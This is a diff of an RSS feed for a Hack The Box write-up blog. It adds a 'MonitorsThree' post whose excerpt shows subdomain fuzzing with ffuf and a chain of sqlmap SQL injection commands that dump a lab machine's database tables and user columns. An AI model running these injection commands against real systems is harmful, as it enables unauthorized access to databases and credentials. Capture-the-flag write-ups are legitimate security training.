@@ -2,20 +2,33 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Medium on Prickly Phish writeups</title>
-    <link>https://example.org/topics/medium/</link>
+    <link>https://prickly-phish.netlify.app/topics/medium/</link>
     <description>Recent content in Medium on Prickly Phish writeups</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <copyright>© 2025 </copyright>
-    <lastBuildDate>Sun, 29 Sep 2024 13:49:05 +0000</lastBuildDate><atom:link href="https://example.org/topics/medium/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 26 Nov 2024 19:01:10 +0000</lastBuildDate><atom:link href="https://prickly-phish.netlify.app/topics/medium/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>MonitorsThree</title>
+      <link>https://prickly-phish.netlify.app/posts/htb/monitorsthree/</link>
+      <pubDate>Tue, 26 Nov 2024 19:01:10 +0000</pubDate>
+      
+      <guid>https://prickly-phish.netlify.app/posts/htb/monitorsthree/</guid>
+      <description>monitorsthree # User # sudo bash -c &amp;#34;echo &amp;#39;10.10.11.30 monitorsthree.htb&amp;#39;&amp;gt;&amp;gt; /etc/hosts&amp;#34; Can&amp;rsquo;t see anything of interest off the bat lets do some enumeration
+ffuf -u http://monitorsthree.htb -H &amp;#34;Host:FUZZ.monitorsthree.htb&amp;#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac Found the app login section
+The password recovery section was vulnerable to sql injection
+sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --dbs sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db --tables sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -columns sqlmap -u monitorsthree.</description>
+      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://prickly-phish.netlify.app/posts/htb/monitorsthree/featured.png" />
+    </item>
+    
     <item>
       <title>Blurry</title>
-      <link>https://example.org/posts/htb/blurry/</link>
+      <link>https://prickly-phish.netlify.app/posts/htb/blurry/</link>
       <pubDate>Sun, 29 Sep 2024 13:49:05 +0000</pubDate>
       
-      <guid>https://example.org/posts/htb/blurry/</guid>
+      <guid>https://prickly-phish.netlify.app/posts/htb/blurry/</guid>
       <description>Lorem ipsum</description>
-      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://example.org/posts/htb/blurry/featured.png" />
+      <media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://prickly-phish.netlify.app/posts/htb/blurry/featured.png" />
     </item>
     
   </channel>
